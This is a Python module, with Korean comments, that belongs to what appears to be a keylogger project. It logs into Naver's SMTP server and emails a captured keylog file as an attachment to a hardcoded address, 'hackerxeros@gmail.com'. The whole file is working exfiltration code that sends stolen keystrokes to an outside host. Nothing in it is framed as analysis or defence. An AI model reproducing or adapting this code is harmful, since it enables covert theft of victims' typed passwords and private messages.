import smtplib
import filemanager
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def main():
    # 메일을 발신할 네이버 ID, PW 설정
    naver_id = "id"
    naver_pw = "pw"

    # 메일을 보내기 위해 네이버 SMTP 서버 설정
    naver_server = smtplib.SMTP_SSL('smtp.naver.com', 465)
    # 네이버 서버에 로그인
    naver_server.login(naver_id, naver_pw)

    msg = MIMEBase('multipart', 'mixed')
    cont = MIMEText('Keylogs', 'plain', 'utf-8')
    cont['Subject'] = 'Keylog' # 제목
    cont['From'] = 'hackerxeros@naver.com' # 발신자
    cont['To'] = 'hackerxeros@gmail.com' # 수신자
    msg.attach(cont)

    # 첨부파일 설정
    path = filemanager.getlogfilepath(filemanager.getlogfilename())
    part = MIMEBase("application", "octet-stream")
    part.set_payload(open(path, 'rb').read() )
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="%s"'% os.path.basename(path))

    msg.attach(part)
    naver_server.sendmail('hackerxeros@naver.com', 'hackerxeros@gmail.com', msg.as_string()) # 발신자, 수신자
    naver_server.quit()